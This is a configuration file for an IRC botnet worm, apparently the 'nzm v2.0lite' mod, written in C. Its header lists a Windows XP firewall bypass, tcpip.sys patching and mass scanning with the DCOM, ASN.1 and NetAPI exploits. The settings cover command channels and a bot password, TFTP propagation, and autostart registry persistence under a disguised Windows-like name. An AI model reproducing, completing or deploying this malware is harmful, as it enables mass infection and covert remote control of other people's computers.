/*
---------------------------
nzm mod by D public release
---------------------------

modifications&addons:
- md5 protection for download, update and remove commands
- windows xp sp2 firewall bypass
- windows xp sp2 tcpip.sys fix
- working dcom, asn and netapi
- vnc authbypass scanner
- new scanning parameters (see below)
- working mass scan

COMMANDS FOR SCAN
default scan:
.advscan <exploit> <threads> <delay> <time> <IP and/or parameters r, b, a, w, y> [parameters l, s]
vnc scan with default wordlist: (removed in this public version - not working)
.advscan vncps <threads> <delay> <time> <IP and/or parameters r, b, a, w, y> [parameters o, l, s]
vnc scan with external wordlist: (removed in this public version - not working)
.advscan vncps <threads> <delay> <time> <IP and/or parameters r, b, a, w, y> <url> <numofpasses> <parameter: v> [parameters o, l, s]
mass scan:
.mass <threads per sploit> <parameters r, b, a, w, y> [parameters l, s]

parameters:
-r = random in C&D class IP
-a = sequential on defined A class IP
-b = sequential on defined A&B class IP
-w = random B class picked, scanning random IPs C&D class
-y = random B class picked, scanning sequential IPs C&D class

-s = silent
-l = if lan IP, join lan channel and dont scan
-v = use external wordlist defined by url (if the wordlist doesnt exists, bot use integrated wordlist) (removed in this public version - not working)
-o = try to root vnc machine if access granted (removed in this public version - not working)

*/

int port = 3;				// server port
int port2 = 7755;				// backup server port
int tftpport = 69;				// Port # for tftp daemon to run on - dont change!
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 4;				// how many random numbers in the nick
int nicktype = DNICK;		// nick type (see rndnick.h)
//other nicks commented out! if you wanna use them, edit rndnick.cpp and rndnick.h

BOOL BypassFW = TRUE;
BOOL PatchTCPIP = TRUE;

//working scanall, fixed by D
SCANALL scanall[]={
{"dcom135", true},
{"asn1smbnt", true},
{"asn1smb", true},
{"netapi", true},
{NULL, false}
};

char botid[] = "1337bot";								// bot id
char version[] = "nzm v2.0lite Stable mod by D";		// Bots !version reply
char password[] = "b";						// bot password
char server[] = "";							// server
char serverpass[] = "";						// server password
char channel[] = "#new";						// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "win.exe";						// destination file name
char valuename[] = "Windows VirsResource";						// value name for autostart
char nickconst[] = "";						// first part to the bot's nick
char modeonconn[] = "+i-x";					// Can be more than one mode and contain both + and -
char exploitchan[] = "new";					// Channel where tftp&ftp messages get redirected

char vncchan[] = "#new";

char lanchan[] = "#new"; //channel where LAN bots go in case scan is on (you can use them for vnc scanning for example)

char techchan[] = "#new"; //for tcpip.sys fixes, wordlist downloads...

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"roffer v1.2b24 [20031215140650], http://iroffer.org/",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

//custom commands CHANGE THEM!!!
const char slogin[]="login"; //bot login
